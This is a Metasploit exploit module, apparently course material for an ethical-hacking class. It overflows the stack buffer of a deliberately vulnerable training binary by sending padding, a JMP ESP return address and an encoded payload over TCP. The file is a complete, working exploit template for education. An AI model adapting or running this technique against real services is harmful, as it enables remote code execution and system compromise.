require 'msf/core'


class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Academic Buffer Overflow - JMP ESP',
      'Description'    => %q{
        Academic exploit for the ethical hacking classes (with neither NX nor ASLR) using JMP ESP.
        Use with challenge_jmpesp executable
      },
      'Author'         => [ 'gmacia' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          [
            'Linux x86 - JMP ESP',
            {
              'Ret'    => 0x08049723,   # address of JMP ESP
              'Offset' => 76
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'Payload' => {
        'Space'    => 400,
        'BadChars' => "\x00\x0a\x0d"    # \n y \r cannot go in the payload
      }
    ))

    register_options(
      [
        Opt::RPORT(12345)   # Choose the port of the application
      ]
    )
  end

  def exploit
    connect

    begin
      banner = sock.get_once(-1, 2)
      #print_status("Banner: #{banner.strip}") if banner
    rescue
    end

    print_status("Offset: #{target['Offset']} | JMP ESP: 0x%08x" % target.ret)

    # Payload structure:
    # [padding] + [JMP ESP] + [payload] + "\n"
    # "\n" will be eliminated by the programme
    
    buf  = "A" * target['Offset']
    buf << [target.ret].pack('V')
    buf << payload.encoded
    buf << "\n"                         

    print_status("Sending buffer (#{buf.length} bytes)..")
    sock.put(buf)

    handler
    disconnect
  end
end
